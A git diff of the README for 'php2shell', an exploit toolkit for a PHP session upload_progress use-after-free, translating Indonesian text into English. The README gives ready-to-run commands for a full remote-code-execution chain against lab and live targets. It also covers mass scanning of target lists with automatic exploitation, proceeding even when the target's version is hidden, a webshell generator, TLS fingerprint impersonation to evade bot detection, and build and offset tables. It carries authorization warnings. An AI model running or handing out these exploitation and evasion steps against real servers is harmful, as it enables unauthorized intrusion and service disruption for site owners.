@@ -10,17 +10,17 @@
 
 [![PHP](https://img.shields.io/badge/PHP-5.4%20→%208.4.26-777BB4?style=flat-square&logo=php&logoColor=white)](https://www.php.net)
 [![CVSS](https://img.shields.io/badge/CVSS%204.0-9.2%20Critical-cb2431?style=flat-square)](https://www.first.org/cvss/)
-[![Tests](https://img.shields.io/badge/tests-46%2F46-brightgreen?style=flat-square)](#-verification)
+[![Tests](https://img.shields.io/badge/tests-133-brightgreen?style=flat-square)](#-verification)
 [![Platform](https://img.shields.io/badge/platform-Linux-blue?style=flat-square&logo=linux&logoColor=white)](#-the-5-lab-requirements)
 [![License: GPL‑3.0](https://img.shields.io/badge/license-GPL--3.0-informational?style=flat-square)](LICENSE)
 [![Docker](https://img.shields.io/badge/lab-docker%20one--command-2496ED?style=flat-square&logo=docker&logoColor=white)](#-one-command-lab)
-[![Landing Page](https://img.shields.io/badge/landing%20page-web%2Findex.html-00ff88?style=flat-square)](web/index.html)
+[![Landing Page](https://img.shields.io/badge/landing%20page-docs%2Findex.html-00ff88?style=flat-square)](docs/index.html)
 
-[Landing Page](web/index.html) · [Install](#-install) · [Quick start](#-quick-start) · [Lab vs Live](#-lab-target-vs-live-target-baca-ini-sebelum-menjalankan) · [Modes](#-modes) · [Sumber repo](#-sumber-repo-bukan-fork-tapi-turunan-beberapa-repo) · [Kredit riset](#kredit-riset--siapa-menemukan-siapa-menuliskan) · [How it works](#-how-it-works) · [Stealth](#-stealth-anti-bot-detection) · [FAQ](#-faq) · [Disclaimer](#-disclaimer-authorized-use-only)
+[Landing Page](docs/index.html) · [Install](#-install) · [Quick start](#-quick-start) · [Lab vs Live](#-lab-target-vs-live-target--read-this-before-running) · [Modes](#-modes) · [Repo sources](#-repo-sources--not-a-fork-but-a-derivative-of-several-repos) · [Research credits](#research-credits--who-found-it-who-wrote-it-down) · [How it works](#-how-it-works) · [Stealth](#-stealth--anti-bot-detection) · [FAQ](#-faq) · [Disclaimer](#-disclaimer--authorized-use-only)
 
 </div>
 
-> 🌐 **Landing Page & Web UI**: Dokumentasi interaktif dan simulasi tersedia di [`web/index.html`](web/index.html). Halaman statis ini bisa diakses lokal via `python3 -m http.server` di folder `web/`.
+> 🌐 **Landing Page & Web UI**: an interactive documentation page and simulation are available at [`docs/index.html`](docs/index.html). This static page can be served locally with `python3 -m http.server` inside the `docs/` folder.
 
 ---
 
@@ -50,7 +50,7 @@ blocked, and evidence is retrieved automatically — it demonstrates impact
 | | CVE-2026-109619 | CVE-2026-109618 |
 |---|---|---|
 | **Class** | stale global state → UAF | OOM bailout corruption → longjmp |
-| **Trigger** | `session.upload_progress` multipart callbacks run **before RINIT**; OOM leaves `PS(http_session_vars)` / `PS(id)` dangling → next request on the **same worker** calls `zval_ptr_dtor` on freed memory | `zend_bailout()` mid-allocation leaves half-built structures in global state |
+| **Trigger** | `session.upload_progress` multipart callbacks run **before RINIT**; OOM leaves `PS(http_session_vars)` / `PS(id)` dangling → the next request on the **same worker** calls `zval_ptr_dtor` on freed memory | `zend_bailout()` mid-allocation leaves half-built structures in global state |
 | **Requests** | 2 (producer + consumer) | 1 |
 | **Fix** | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 | same |
 | **Status in this toolkit** | ✅ **implemented — full 0→RCE chain** | ⛔ intentionally not implemented (detect/preflight only) |
@@ -68,13 +68,13 @@ issues. PHP ≤ 8.1 is EOL: no backports, vulnerable forever.
 | ≤ 8.1 | all (EOL) | never |
 
 Highest impact: **mod_php + prefork** (cross-request worker reuse).
-php-fpm is a strong mitigation (worker dies per-request).
+php-fpm is a strong mitigation (the worker dies per request).
 CDN-hidden versions? **Detection is information, not a gate** — preflight
 reports what it can see and the chain proceeds anyway.
 
 ### Post-release advisory (verified 2026-10-24, primary sources)
 
-- **Patches were rebuilt on 22 Oct 2026** — `8.5.12` and `8.4.27` carry
+- **The patches were rebuilt on 22 Oct 2026** — `8.5.12` and `8.4.27` carry
   ChangeLog entries dated 22 Oct (`Avoid state corruption via bailout`), but the
   version numbers did not change. The same `8.4.27` can mean the 21 Oct build
   (not final) or the 22 Oct build (final). **Check the package build date, not
@@ -87,10 +87,10 @@ reports what it can see and the chain proceeds anyway.
   `session.upload_progress.enabled=0`. **NOT closed by the fix-floor below —
   see the callout right after this list.**
 
-> **CVE-2026-115560 (2026-10-23, belum dipatch):** fix-floor di atas **tidak
-> menutup** bug session serialize_handler mismatch (object injection via
-> `ini_set` app-side). `patched` + `upload_progress=On` ≠ aman — detect
-> mencetak caveat ini otomatis. Detail: `docs/CVE-2026-115560.md`.
+> **CVE-2026-115560 (2026-10-23, not yet patched):** the fix-floor above does
+> **not** close the session serialize_handler mismatch bug (object injection via
+> app-side `ini_set`). `patched` + `upload_progress=On` ≠ safe — detect
+> prints this caveat automatically. Details: `docs/CVE-2026-115560.md`.
 - **`memory_limit=-1` is NOT a complete mitigation** (GHSA-w8hw-w9fx-j79w).
   If a base allocation fails, `longjmp()` can still happen while request memory
   is reachable. Only upgrading is complete.
@@ -146,7 +146,7 @@ bash lab/lab_docker.sh start
 ## ❖ Quick start
 
 ```bash
-# 0) fresh binary offsets (required after every imagechange)
+# 0) fresh binary offsets (required after every image change)
 python3 docker/offsets.py          # → out/offsets.env
 
 # 1) run the chain with automatic proof retrieval
@@ -161,492 +161,495 @@ php2shell exploit \
 | |_) | |_| | |_) |__) \___ \| |_| |  _| | |   | |
 |  __/|  _  |  __// __/ ___) |  _  | |___| |___| |___
 |_|   |_| |_|_|  |_____|____/|_| |_|_____|_____|_____|
-  P H P 2 S H E L L  v1.3.0  -  toolkit terpadu
+  P H P 2 S H E L L  v1.3.0  -  integrated toolkit
   ----------------------------------------------------------------
-  diuji: CVE-2026-109619 (rantai penuh)   deteksi: CVE-2026-109618 (rantai beda, tidak dijalankan)
+  tested: CVE-2026-109619 (full chain)   detected: CVE-2026-109618 (different chain, not executed)
   fix-floor: 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12
-  terakhir rentan: 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11
+  last vulnerable: 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11
   ----------------------------------------------------------------
   stealth: curl_cffi JA3 impersonate
   ----------------------------------------------------------------
 
   mode       : scan  |  detect  |  preflight  |  exploit  |  shell  |  version
-  cepat      : php2shell.py scan -l targets.txt
-  bantuan    : php2shell.py --help
+  quick      : php2shell.py scan -l targets.txt
+  help       : php2shell.py --help
 
-  pagar & peringatan: php2shell.py --help  |  rincian: README.md
+  fences & warnings: php2shell.py --help  |  details: README.md
 ```
 
-*(persis banner yang dicetak CLI saat dijalankan — sumber: `lib/banner.py`)*
+*(exactly the banner the CLI prints when run — source: `lib/banner.py`)*
 
 ---
 
-## ❖ Lab target vs Live target — baca ini sebelum menjalankan
+## ❖ Lab target vs Live target — read this before running
 
-Dua skenario berbeda, dan **command-nya beda**:
+Two different scenarios, and **the commands differ**:
 
-### A) Lab lokal (`127.0.0.1`) — full proof
+### A) Local lab (`127.0.0.1`) — full proof
 
 ```bash
 php2shell exploit -u http://127.0.0.1:8095/index.php --force --yes \
     --exploit-profile bookworm -c 'id>/out/p1'
-# → PROOF (8.3s): uid=33(www-data)   ← hasil perintah TERBACA otomatis
+# → PROOF (8.3s): uid=33(www-data)   ← command output READ back automatically
 ```
 
-Kenapa bisa terbaca? `id>/out/p1` menulis hasil `id` ke file `/out/p1` di
-dalam container, dan folder itu **di-mount ke host** (`out/p1`). Toolkit
-otomatis membacanya → kamu lihat `uid=33(www-data)` di terminal.
+Why is it readable? `id>/out/p1` writes the output of `id` to the file `/out/p1`
+inside the container, and that folder **is mounted onto the host** (`out/p1`). The
+toolkit reads it automatically → you see `uid=33(www-data)` in your terminal.
 
-### B) Live target (website aktif) — blind by design
+### B) Live target (a real website) — blind by design
 
 ```bash
 php2shell exploit -u https://target.example/ --yes -c 'id'
-# → stage 1/2/3 selesai, tapi:
-# → BLIND — perintah terkirim, tapi tidak ada kanal bukti
+# → stages 1/2/3 completed, but:
+# → BLIND — the command was sent, but there is no proof channel
 ```
 
-Di live target **`id>/out/p1` TIDAK berguna** — folder `/out` di server
-target tidak di-mount ke mesinmu, jadi tidak ada yang bisa dibaca. Hasilnya
-`BLIND`: rantai *dieksekusi* (worker mati + restart = jejak jelas di log
-server), tapi output perintah tidak sampai ke kamu.
+On a live target **`id>/out/p1` is USELESS** — the `/out` folder on the target
+server is not mounted onto your machine, so there is nothing to read. The result is
+`BLIND`: the chain *is executed* (worker dies + restarts = a clear trace in the
+server log), but the command output never reaches you.
 
-**Itu keputusan desain, bukan kekurangan:** repot-repot buat "kanal baca
-output" di live target = membuat tool ekstraksi data = melintasi garis
-proof-of-access → backdoor. Toolkit ini sengaja berhenti di bukti *eksekusi*
-(worker crash pattern + stage 3 selesai), bukan bukti *output perintah*.
+**That is a design decision, not a shortcoming:** going to the trouble of building
+an "output read channel" on a live target = building a data-exfiltration tool =
+crossing the line from proof-of-access → backdoor. This toolkit deliberately stops
+at proof of *execution* (worker crash pattern + stage 3 completion), not proof of
+*command output*.
 
-**Alur kerja yang disarankan di live target:**
+**The recommended workflow on a live target:**
 
 ```bash
-# 1) RECON dulu — tanpa menyentuh exploit:
+# 1) RECON first — without touching exploit:
 php2shell detect    -u https://target.example/
 php2shell preflight -u https://target.example/
-# verdict: vulnerable / patched / unknown (CDN) + skor kesiapan
+# verdict: vulnerable / patched / unknown (CDN) + readiness score
 
-# 2) Cek upload_progress & display_errors bocor atau tidak:
-#    kalau CDN menutup versi → tetap boleh lanjut (deteksi bukan gerbang)
+# 2) Check whether upload_progress & display_errors leak or not:
+#    if the CDN withholds the version → you may still proceed (detection is not a gate)
 
-# 3) Eksploitasi (kalau target MILIKMU / ada izin):
+# 3) Exploitation (if the target is YOURS / you have permission):
 php2shell exploit -u https://target.example/ --yes -c 'id'
-# hasil BLIND = dieksekusi tapi output tak terbaca
-# bukti dampak: worker crash di log server + stage-3 completion
+# BLIND result = executed but output not readable
+# impact proof: worker crash in the server log + stage-3 completion
 ```
 
-> ⚠️ **Sadar risiko di live target:** setiap percobaan membuat 1 worker
-> Apache **mati (SIGABRT)** lalu di-fork ulang. Di server produksi itu =
-> gangguan layanan + jejak log yang sangat jelas + kemungkinan WAF block.
-> Sekali coba sudah cukup untuk membuktikan — loop retry 3×3 hanya untuk lab.
+> ⚠️ **Be aware of the risk on a live target:** every attempt makes one Apache
+> worker **die (SIGABRT)** and then get forked again. On a production server that
+> means service disruption + an extremely obvious log trail + a possible WAF
+> block. One attempt is enough to prove it — the 3×3 retry loop is for the lab only.
 
 ---
 
 ## ❖ Modes
 
-### `scan -l targets.txt` — banyak target sekaligus
+### `scan -l targets.txt` — many targets at once
 
 ```bash
-php2shell.py scan -l targets.txt                     # detect + preflight semua
-php2shell.py scan -l targets.txt --exploit --yes     # + exploit yang READY saja
-php2shell.py scan -l targets.txt --threads 10        # paralel
+php2shell.py scan -l targets.txt                     # detect + preflight everything
+php2shell.py scan -l targets.txt --exploit --yes     # + exploit only the ones READY
+php2shell.py scan -l targets.txt --threads 10        # parallel
 php2shell.py scan -l targets.txt --json out/r.json --csv out/r.csv
 ```
 
-Format file: satu URL/baris, `#` komentar, duplikat dibuang (case & trailing
-slash dianggap sama), baris tanpa `://` otomatis `https://`.
-Hasil: tabel terminal + JSON + CSV (verdict, versi, skor, ready, proof).
+File format: one URL per line, `#` comments, duplicates dropped (case & trailing
+slash are considered the same), lines without `://` get `https://` automatically.
+Result: a terminal table + JSON + CSV (verdict, version, score, ready, proof).
 
-### `detect -u URL` — intip versi (read-only, tidak menyerang)
+### `detect -u URL` — peek at the version (read-only, does not attack)
 
 ```bash
 php2shell.py detect -u https://target.example/
 ```
-Membaca: versi PHP (header/X-Powered-By/error page), branch & fix-floor
-verdict (vulnerable/patched/EOL), status `session.upload_progress`,
-status `display_errors`. Zaranya GET biasa.
 
-**Deteksi aktif OOM (baru, v1.4.0)** — otomatis menyala bila verdict
-masih `unknown`/`eol` setelah probe pasif (versi PHP disembunyikan CDN
-atau target EOL). Metodologi mengikuti
+Reads: PHP version (header/X-Powered-By/error page), branch & fix-floor
+verdict (vulnerable/patched/EOL), `session.upload_progress` status,
+`display_errors` status. Its ammunition is an ordinary GET.
+
+**Active OOM detection (new, v1.4.0)** — switches on automatically when the verdict
+is still `unknown`/`eol` after the passive probe (the PHP version is hidden by a CDN
+or the target is EOL). The methodology follows
 [assetnote/php2shell-scanner](https://github.com/assetnote/php2shell-scanner):
-control request + tiga probe multipart dengan array-key nested-62 level
-(1 → 8 → 20 MiB). Verdict `vulnerable` bila muncul salah satu:
-- fatal `Allowed memory size ... in Unknown` (OOM di dalam parser
-  multipart), atau
-- differential empty HTTP 500 (worker FPM mati di tengah), atau
-- 502/503/504 (worker abort di belakang front).
+a control request + three multipart probes with nested-62-level array keys
+(1 → 8 → 20 MiB). Verdict `vulnerable` when any of the following appears:
+- a fatal `Allowed memory size ... in Unknown` (OOM inside the multipart
+  parser), or
+- a differential empty HTTP 500 (the FPM worker dies mid-request), or
+- 502/503/504 (the worker aborts behind the front end).
 
-Perlindungan false-positive: warning `POST Content-Length exceeds the
-limit` (lokasi juga `Unknown`, tapi itu post_max_size guard — bukan bug)
-TIDAK dihitung sebagai sinyal.
+False-positive protection: the warning `POST Content-Length exceeds the
+limit` (its location is also `Unknown`, but that is the post_max_size guard — not
+the bug) is NOT counted as a signal.
 
 ```bash
-php2shell.py detect -u https://target.example/          # OOM otomatis (bila unknown/eol)
-php2shell.py detect -u https://target.example/ --no-oom  # matikan OOM probe
+php2shell.py detect -u https://target.example/          # OOM automatic (when unknown/eol)
+php2shell.py detect -u https://target.example/ --no-oom  # turn the OOM probe off
 ```
-Catatan: bila `memory_limit` target > 20 MiB, OOM tidak tercapai →
-verdict tetap `inconclusive` dengan alasan eksplisit (bukan "not
-vulnerable"). Target dengan versi terbaca >= fix-floor tidak pernah
-diprobe OOM (hemat dan minim jejak).
+Note: if the target's `memory_limit` is > 20 MiB, OOM is never reached →
+the verdict stays `inconclusive` with an explicit reason (not "not
+vulnerable"). Targets whose version is readable and >= fix-floor are never
+OOM-probed (cheaper and leaves the smallest trace).
 
-### `preflight -u URL` — skor kesiapan + blocker
+### `preflight -u URL` — readiness score + blockers
 
 ```bash
 php2shell.py preflight -u https://target.example/
 ```
-Skor 0–90 dari: versi rentan (30), upload_progress On (30), display_errors
-On (15), versi dikenali (15). **Filosofi: deteksi = informasi, bukan gerbang** —
-versi tersembunyi CDN tetap lanjut; blocker keras cuma 2: server mati, atau
-versi TERBACA sudah-patch.
+Score 0–90 from: vulnerable version (30), upload_progress On (30), display_errors
+On (15), version recognised (15). **Philosophy: detection = information, not a gate** —
+a version hidden by a CDN still proceeds; there are only 2 hard blockers: the server is
+down, or the READ version is already patched.
 
-### `exploit -u URL` — rantai penuh
+### `exploit -u URL` — the full chain
 
 ```bash
-# lab lokal (mount /out) → hasil perintah TERBACA:
+# local lab (mount /out) → command output READ back:
 php2shell.py exploit -u http://127.0.0.1:8095/index.php --force --yes \
     --exploit-profile bookworm -c 'id>/out/p1'
 
-# live target → BLIND (perintah jalan, output tak terbaca — by design):
+# live target → BLIND (command runs, output not readable — by design):
 php2shell.py exploit -u https://target.example/ --yes -c 'id'
 ```
-Opsi penting:
-| Flag | Fungsi |
+Important options:
+| Flag | Function |
 |---|---|
-| `-c / --cmd` | perintah proof, maks 14 byte; default `id` |
-| `--allow-cmd CMD` | tambah whitelist (ls/cat/df/uname/dll) — berulang |
-| `--exploit-profile {bookworm,lab}` | set offset bawaan (bookworm = image resmi) |
-| `--zif-offset / --dtor-offset / --htdata-offset` | offset manual utk build lain |
-| `--retries N` | retry per stage (default 3, heap-fresh via rotasi worker) |
-| `--huge-mb N` | paksa ukuran field OOM stage-1 (default: dibaca dari `memory_limit`) |
-| `--force` | paksa lewat preflight TIDAK-READY (tetap konfirmasi) |
-| `--exploit-timeout N` | batas waktu total rantai (default 300s) |
+| `-c / --cmd` | proof command, max 14 bytes; default `id` |
+| `--allow-cmd CMD` | add to the whitelist (ls/cat/df/uname/dll) — repeatable |
+| `--exploit-profile {bookworm,lab}` | set the built-in offsets (bookworm = the official image) |
+| `--zif-offset / --dtor-offset / --htdata-offset` | manual offsets for other builds |
+| `--retries N` | retries per stage (default 3, heap-fresh via worker rotation) |
+| `--huge-mb N` | force the size of the stage-1 OOM field (default: read from `memory_limit`) |
+| `--force` | force past a NOT-READY preflight (confirmation still required) |
+| `--exploit-timeout N` | total time limit for the chain (default 300s) |
 
-#### Kenapa `--huge-mb` sekarang otomatis
+#### Why `--huge-mb` is automatic now
 
-Stage 1 mengirim satu field multipart yang **harus lebih besar** dari
-`memory_limit` target — itulah pemicu OOM-nya. Dulu nilainya dipaku 12 MB,
-dan akibatnya berbeda-beda tergantung target:
+Stage 1 sends a single multipart field that **must be larger** than the target's
+`memory_limit` — that is what triggers the OOM. It used to be nailed to 12 MB,
+and the consequence differed from target to target:
 
-| `memory_limit` target | 12 MB hardcoded | sekarang |
+| target `memory_limit` | 12 MB hardcoded | now |
 |---|---|---|
-| 8 M | OOM, rantai jalan | baca 8 M → kirim 10 MB |
-| 128 M | **tidak OOM**, rantai mati tanpa sebab jelas | baca 128 M → kirim 147 MB |
-| 512 M | **tidak OOM**, dan 12 MB terkirim sia-sia | berhenti + peringatan |
+| 8 M | OOM, the chain runs | read 8 M → send 10 MB |
+| 128 M | **no OOM**, the chain dies without a clear reason | read 128 M → send 147 MB |
+| 512 M | **no OOM**, and 12 MB sent for nothing | stop + warning |
 
-Kegagalan di baris kedua dan ketiga terlihat identik dari luar ("stage1
-gagal"), padahal penyebabnya beda. Sekarang `exploit` mengirim **satu**
-request probe lebih dulu, membaca angka dari pesan fatal PHP
-(`Allowed memory size of N bytes exhausted`), lalu menyetel field-nya
-sedikit di atas limit.
+Failures in the second and third rows look identical from the outside ("stage1
+failed"), even though the causes differ. Now `exploit` sends **one** probe
+request first, reads the number out of the PHP fatal message
+(`Allowed memory size of N bytes exhausted`), and then sets the field
+slightly above the limit.
 
-Yang **tidak** dilakukan tool ini: menaikkan ukuran sampai berhasil.
-Kalau angkanya tidak terbaca (`display_errors=Off`), ia memakai default 12 MB
-dan mengatakan demikian — tidak menyapu 256 MB ke target orang untuk
-menebak. Kalau `memory_limit` di atas 512 MB, ia berhenti dan melapor,
-karena rantai ini memang tidak akan jalan di sana.
+What this tool does **not** do: keep raising the size until it works.
+If the number is unreadable (`display_errors=Off`), it uses the 12 MB default
+and says so — it does not sweep 256 MB at someone's target just to
+guess. If `memory_limit` is above 512 MB, it stops and reports,
+because this chain really will not run there.
 
-#### Syarat target yang benar-benar menentukan
+#### The target requirements that actually matter
 
-Rantai gagal di stage 1 bukan karena jumlah worker Apache, melainkan karena
-**request tidak pernah sampai utuh ke PHP**. Kalau `post_max_size` lebih
-kecil dari body stage-1, PHP membuang body itu sebelum skrip jalan — dan
-di luar kegagalannya identik dengan "target tidak rentan".
+The chain fails at stage 1 not because of the number of Apache workers, but because
+**the request never reaches PHP intact**. If `post_max_size` is smaller
+than the stage-1 body, PHP discards that body before the script runs — and
+from the outside the failure is identical to "the target is not vulnerable".
 
-| Setelan | Syarat | Kenapa |
+| Setting | Requirement | Why |
 |---|---|---|
-| `post_max_size` | ≥ 64M | body stage-1 lebih besar dari `memory_limit`; kalau ini lebih kecil, body dibuang mentah-mentah |
-| `upload_max_filesize` | ≥ 64M | batas per-file untuk field multipart |
+| `post_max_size` | ≥ 64M | the stage-1 body is larger than `memory_limit`; if this is smaller, the body is thrown away outright |
+| `upload_max_filesize` | ≥ 64M | the per-file limit for the multipart field |
 
-`exploit` sekarang membedakan keduanya dan berhenti dalam ~2 detik dengan
-alasan yang benar:
+`exploit` now distinguishes the two and stops within ~2 seconds with
+the correct reason:
 
 ```
-[*] body 16 MB ditolak target sebelum skrip jalan — post_max_size terlalu kecil untuk stage-1
-     gagal (0.0s): target menolak body stage-1 sebelum PHP menjalankan skrip ...
+[*] 16 MB body rejected by the target before the script ran — post_max_size too small for stage-1
+     failed (0.0s): the target rejected the stage-1 body before PHP ran the script ...
 ```
 
-Klaim populer "butuh 150 worker, sisakan 1" (dari `9bie`) **tidak terbukti**
-saat diuji ulang: rantai jalan dengan 1 worker maupun 150 worker. Angka 150
-ternyata hanya bawaan `mpm_prefork.conf` stock. Percobaan lengkapnya ada di
+The popular claim "you need 150 workers, leave 1 spare" (from `9bie`) is **not proven**
+on re-test: the chain runs with 1 worker as well as with 150 workers. The number 150
+turns out to be just the stock `mpm_prefork.conf` default. The full experiment is in
 [`docs/SYARAT_TARGET.md`](docs/SYARAT_TARGET.md).
 
 ```console
 $ php2shell.py exploit -u http://target/index.php -c 'id>/out/p1'
-[*] memory_limit 8 MiB terbaca dari target; field 'big' disetel 10 MB (harus > limit)
-     stage 1: heap leak (percobaan 1/3)
+[*] memory_limit 8 MiB read from the target; field 'big' set to 10 MB (must be > limit)
+     stage 1: heap leak (attempt 1/3)
      PROOF (7.7s): uid=33(www-data) gid=33(www-data)
 ```
 
-### `shell` — generator webshell berpassword
+### `shell` — password-protected webshell generator
 
 ```bash
 php2shell.py shell --out shell/out --ttl 72
 ```
-Menghasilkan file PHP (nama 32-hex) + `CREDENTIALS.txt` (bcrypt, TIDAK
-disimpan di shell). Fitur: password bcrypt, whitelist perintah per shell,
-TTL kedaluwarsa, rate limit. **Generator saja — tidak meng-upload.**
-Uji lokal: `php -l <file>` lalu `php -S 127.0.0.1:8099`.
+Produces a PHP file (32-hex name) + `CREDENTIALS.txt` (bcrypt, NOT
+stored inside the shell). Features: bcrypt password, per-shell command whitelist,
+expiry TTL, rate limit. **Generator only — it does not upload.**
+Local test: `php -l <file>` then `php -S 127.0.0.1:8099`.
 
-### `version` — cek versi otomatis
+### `version` — automatic version check
 
 ```bash
-php2shell.py version                  # bandingkan dengan rilis publik di GitHub
-php2shell.py version --no-cache       # abaikan cache 1 jam
+php2shell.py version                  # compare against the public release on GitHub
+php2shell.py version --no-cache       # ignore the 1 hour cache
 php2shell.py version --json out/v.json
-php2shell.py detect -u https://t/ --check-version   # cek dulu, lalu lanjut
+php2shell.py detect -u https://t/ --check-version   # check first, then continue
 ```
 
-Sumber pembanding (berurutan, gagal-aman):
+Comparison sources (in order, fail-safe):
 
-| Urutan | Sumber | Keterangan |
+| Order | Source | Note |
 |---|---|---|
-| 1 | `releases/latest` | tag rilis GitHub (kalau sudah ada rilis) |
-| 2 | `/tags` | tag tertinggi, diurutkan numerik (bukan leksikal) |
-| 3 | `VERSION` di branch `main` | fallback selama repo belum punya tag |
+| 1 | `releases/latest` | GitHub release tag (if a release already exists) |
+| 2 | `/tags` | highest tag, sorted numerically (not lexically) |
+| 3 | `VERSION` on branch `main` | fallback while the repo has no tag yet |
 
-Perilaku:
+Behaviour:
 
-- **Gagal-aman**: offline, DNS mati, GitHub rate-limit, repo 404 → status
-  `unknown` + alasan. Tidak pernah crash, tidak pernah menggagalkan mode utama.
-- **Semver numerik**: `1.10` dianggap lebih baru dari `1.2` (bukan string compare).
-- **Cache 1 jam** di `out/version-check.json` supaya tidak kena rate-limit GitHub.
-- **Tanpa telemetry**: hanya GET ke GitHub, tidak mengirim data apa pun.
-- **Exit code**: `0` = terbaru / tidak bisa dicek, `10` = ada update (bisa dipakai
-  sebagai gate CI).
+- **Fail-safe**: offline, dead DNS, GitHub rate-limit, repo 404 → status
+  `unknown` + a reason. It never crashes, it never fails the main mode.
+- **Numeric semver**: `1.10` counts as newer than `1.2` (not a string compare).
+- **1 hour cache** in `out/version-check.json` so GitHub rate-limits do not bite.
+- **No telemetry**: only a GET to GitHub, no data is sent anywhere.
+- **Exit code**: `0` = up to date / cannot check, `10` = an update exists (usable
+  as a CI gate).
 
 ```
-[OK]   lokal   : 1.3.0
-      remote  : 1.3.0  (sumber: branch)
+[OK]   local   : 1.3.0
+      remote  : 1.3.0  (source: branch)
       status  : current
-      pesan   : php2shell 1.3.0 — sudah versi terbaru
+      message : php2shell 1.3.0 — already the latest version
       repo    : https://github.com/aarsaputra/php2shell
 ```
 
-### `builds` — build mana yang benar-benar bisa di-RCE
+### `builds` — which builds can actually be RCE'd
 
-Ini menjawab pertanyaan yang paling sering salah dijawab: **"target ini bisa
-di-RCE atau cuma bisa dibocorkan?"** Sebelum versi 1.3.0, `preflight` memberi
-`READY` untuk build apa pun yang lolos cek versi — padahal PHP 8.3.x terbukti
-hanya bisa sampai stage leak.
+This answers the question that is most often answered wrongly: **"can this target
+be RCE'd or can it only be leaked?"** Before version 1.3.0, `preflight` returned
+`READY` for any build that passed the version check — even though PHP 8.3.x is proven
+to only reach the leak stage.
 
 ```bash
-php2shell.py builds                 # seluruh tabel
-php2shell.py builds --level rce     # hanya yang RCE-nya terbukti
+php2shell.py builds                 # the whole table
+php2shell.py builds --level rce     # only the ones whose RCE is proven
 php2shell.py builds --json out/b.json
 ```
 
 ```
-  PHP       arch      dukungan  catatan
+  PHP       arch      support   notes
   8.5.11    amd64     RCE       separate offsets, same htdata
   8.5.11    aarch64   RCE       uid=33(www-data)
   8.5.10    aarch64   RCE       uid=33(www-data)
-  8.4.26    amd64     RCE       build referensi lab kita; RCE terbukti disini
-  8.4.25    aarch64   RCE       stage 3 probabilistik — butuh retry
-  8.5.0     any       LEAK      stage-3 layout tidak ditemukan
-  8.3.35    aarch64   LEAK      stage-3 reference hidup, RCE tidak
+  8.4.26    amd64     RCE       our lab reference build; RCE proven here
+  8.4.25    aarch64   RCE       stage 3 probabilistic — needs retries
+  8.5.0     any       LEAK      stage-3 layout not found
+  8.3.35    aarch64   LEAK      stage-3 reference alive, no RCE
   8.3.33    amd64     LEAK      wordpress:7.1.1-apache mod_php
-  8.3.0     aarch64   NO        PS(id) dangling; cookie tidak reclaimed
-  8.2.34    aarch64   NO        UAF ada; bentuk leak berbeda
-  8.1.34    aarch64   NO        UAF ada; bentuk leak berbeda
-  8.0.30    aarch64   NO        UAF ada; bentuk leak berbeda
-  7.4.33    aarch64   NO        UAF ada; bentuk leak berbeda
+  8.3.0     aarch64   NO        PS(id) dangling; cookie not reclaimed
+  8.2.34    aarch64   NO        UAF exists; leak shape differs
+  8.1.34    aarch64   NO        UAF exists; leak shape differs
+  8.0.30    aarch64   NO        UAF exists; leak shape differs
+  7.4.33    aarch64   NO        UAF exists; leak shape differs
 
-  total 13 build: 5 RCE, 3 leak-saja, 5 belum terbukti
+  total 13 builds: 5 RCE, 3 leak-only, 5 unproven
 ```
 
-Arti kolom `dukungan`:
+Meaning of the `support` column:
 
-| Nilai | Arti | Yang terjadi saat exploit |
+| Value | Meaning | What happens during exploit |
 |---|---|---|
-| `RCE` | stage 1+2+3 terbukti di build persis itu | perintah benar-benar dieksekusi, `PROOF` muncul |
-| `LEAK` | stage 1+2 terbukti, stage 3 tidak | berhenti setelah bocoran alamat; perintah **tidak** dieksekusi |
-| `NO` | belum pernah terbukti bisa dilanjutkan | kemungkinan berhenti di stage 1-2 |
-| `?` | build tidak ada di tabel | dicoba dengan offset default; anggap belum pasti |
+| `RCE` | stages 1+2+3 proven on that exact build | the command really executes, `PROOF` appears |
+| `LEAK` | stages 1+2 proven, stage 3 not | stops after the address leak; the command is **not** executed |
+| `NO` | never proven to go further | probably stops at stage 1-2 |
+| `?` | build not in the table | tried with the default offsets; consider it unproven |
 
-Tabel ini juga muncul otomatis di `preflight` sebagai baris `dukungan :` dan di
-kolom ke-3 tabel `scan`/`detect` — jadi keputusan tembak diambil **sebelum**
-rantai dijalankan, bukan setelah menunggu 200 detik kegagalan.
+This table also shows up automatically in `preflight` as the `support :` line and in
+the 3rd column of the `scan`/`detect` table — so the decision to fire is made
+**before** the chain runs, not after waiting 200 seconds for a failure.
 
-Dua hal yang perlu ditegaskan:
+Two things need to be stressed:
 
-- **Arsitektur menentukan.** `8.4.26` RCE di `amd64`, tapi hanya `LEAK` di
-  `aarch64`. Kalau arsitektur target tidak terbaca, tool memakai entri RCE
-  sebagai perkiraan — dengan catatan bahwa arsitektur menentukan hasil.
-- **`NO` bukan "mustahil".** Itu kata penulis tabel aslinya, dan kita ikut
-  apa adanya. Offset bisa dipasok manual lewat `--zif-offset` / `--dtor-offset`.
-  Kalau kamu punya build yang tidak ada di tabel tapi RCE-nya jalan, itu temuan
-  baru — bukan kesalahan tabel.
+- **Architecture decides.** `8.4.26` is RCE on `amd64`, but only `LEAK` on
+  `aarch64`. If the target architecture is unreadable, the tool uses the RCE
+  entry as an estimate — with the caveat that architecture decides the outcome.
+- **`NO` does not mean "impossible".** That is the word used by the author of the
+  original table, and we follow it as-is. Offsets can be supplied manually via
+  `--zif-offset` / `--dtor-offset`.
+  If you have a build that is not in the table but its RCE works, that is a new
+  finding — not an error in the table.
 
-Sumber tabel: `devploit/php2shell` (13 profil heap, 5 RCE terverifikasi),
-`9bie/php2shell-bypass-aslr-exp` (worker pinning di stock image), dan lab kita
-sendiri (`php:8.4.26-apache`). Tidak ada angka yang dikarang.
+Table sources: `devploit/php2shell` (13 heap profiles, 5 verified RCE),
+`9bie/php2shell-bypass-aslr-exp` (worker pinning on the stock image), and our own lab
+(`php:8.4.26-apache`). No number here is invented.
 
-### Flag global (berlaku semua mode)
+### Global flags (apply to every mode)
 
-| Flag | Fungsi |
+| Flag | Function |
 |---|---|
-| `--ja3 {chrome,safari,firefox,edge,android}` | profil TLS+UA browser (default chrome) |
-| `--delay N` | jeda antar request + jitter (default 1.0s; jitter 0.75–1.35×) |
-| `--timeout N` | timeout HTTP per request (default 15s) |
-| `--proxy URL` | lewat proxy, mis. `http://127.0.0.1:8080` |
-| `--audit FILE` | catat SEMUA request ke JSONL (bukti + troubleshooting) |
